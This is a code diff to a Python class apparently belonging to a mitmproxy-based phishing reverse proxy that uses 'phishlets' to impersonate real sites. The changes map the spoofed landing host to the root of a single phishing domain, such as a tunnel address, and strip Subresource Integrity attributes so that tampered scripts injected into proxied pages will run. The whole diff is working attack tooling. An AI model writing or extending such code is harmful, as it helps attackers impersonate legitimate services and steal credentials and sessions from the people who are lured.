@@ -579,7 +579,15 @@ class VantaInterceptor:
                 if not phish_hostname:
                     for ph in self.phishlet.proxy_hosts:
                         if ph.orig_sub == f.orig_sub and ph.domain == f.domain:
-                            phish_hostname = f"{ph.phish_sub}.{base_domain}"
+                            # Special handling for Landing Host in Single-Domain Mode (Bridges present)
+                            # If bridges are defined, we assume we are running on a single domain (like localhost.run)
+                            # In this case, the Landing ProxyHost (x.com) should map to the ROOT of the phishing domain (ph_host),
+                            # NOT to a subdomain (x.ph_host).
+                            has_bridges = len(getattr(self.phishlet, "bridges", [])) > 0
+                            if has_bridges and ph.is_landing:
+                                phish_hostname = ph_host # Use the current request host as the replacement
+                            else:
+                                phish_hostname = f"{ph.phish_sub}.{base_domain}"
                             break
                 
                 if not phish_hostname: continue
@@ -604,6 +612,13 @@ class VantaInterceptor:
 
     def _inject_scripts(self, flow: http.HTTPFlow):
         if "text/html" in flow.response.headers.get("content-type", ""):
+            # 0. Remove SRI integrity attributes to allow modified scripts to run
+            try:
+                flow.response.text = re.sub(r' integrity="[^"]*"', '', flow.response.text)
+                flow.response.text = re.sub(r" integrity='[^']*'", '', flow.response.text)
+            except Exception:
+                pass
+
             # HTML static URL rewrite for bridges (script/link/img absolute URLs)
             try:
                 import re as _re
